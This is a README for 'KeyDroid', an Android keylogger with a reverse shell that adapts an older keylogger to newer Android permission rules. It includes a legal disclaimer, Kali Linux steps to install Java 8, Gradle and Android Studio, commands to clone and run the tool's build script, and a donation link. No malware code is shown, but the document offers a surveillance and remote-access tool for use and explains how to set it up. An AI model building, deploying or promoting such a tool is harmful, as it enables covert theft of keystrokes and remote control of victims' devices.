# KeyDroid v1.0
## Author: https://github.com/thelinuxchoice/keydroid
## IG: https://www.instagram.com/thelinuxchoice
### Don't copy this code without give me the credits, nerd! 

Android Keylogger + Reverse Shell. This project is an adaptation of project from https://github.com/AbhishekNuevo/AndroidKeylogger to work with Android 6.0 and higher, since API Level 23+ requires permission at runtime.

![k1](https://user-images.githubusercontent.com/34893261/44440300-d530e500-a59d-11e8-9c2f-dbcf90b91929.png)
![k2](https://user-images.githubusercontent.com/34893261/44440304-d9f59900-a59d-11e8-90cb-5f63ed0f64a6.png)

## Legal disclaimer:

Usage of KeyDroid for attacking targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program 


### Installing on Kali Linux:
```
Install dependencies:
# apt-get update
# apt-get install openjdk-8-jdk
# apt-get install gradle

Use Java8:
Get Java8 dir with command:
# update-alternatives --list java

Copy and replace dir on command:
# update-alternatives --set java /usr/lib/jvm/java-8-openjdk-amd64/jre/bin/java

Download Android Studio:
https://developer.android.com/studio

Installing Android Studio:
# unzip ~/Download/android*.zip -d /opt

For AMD64 Arch, Install Android Studio dependencies:
# apt-get install lib32z1 lib32ncurses6 lib32stdc++6


Run Android Studio:
# cd /opt/android-studio/bin
# ./studio.sh

Go to SDK Manager (Configure -> SDK Manager) and Download:
Android SDK Build-tools, Android SDK-tools, Android SDK platform-tools, Support Repository

Run script:
# git clone https://github.com/thelinuxchoice/keydroid
# cd keydroid/
# bash keydroid.sh

```

### Donate!
Support the authors:

<noscript><a href="https://liberapay.com/thelinuxchoice/donate"><img alt="Donate using Liberapay" src="https://liberapay.com/assets/widgets/donate.svg"></a></noscript>
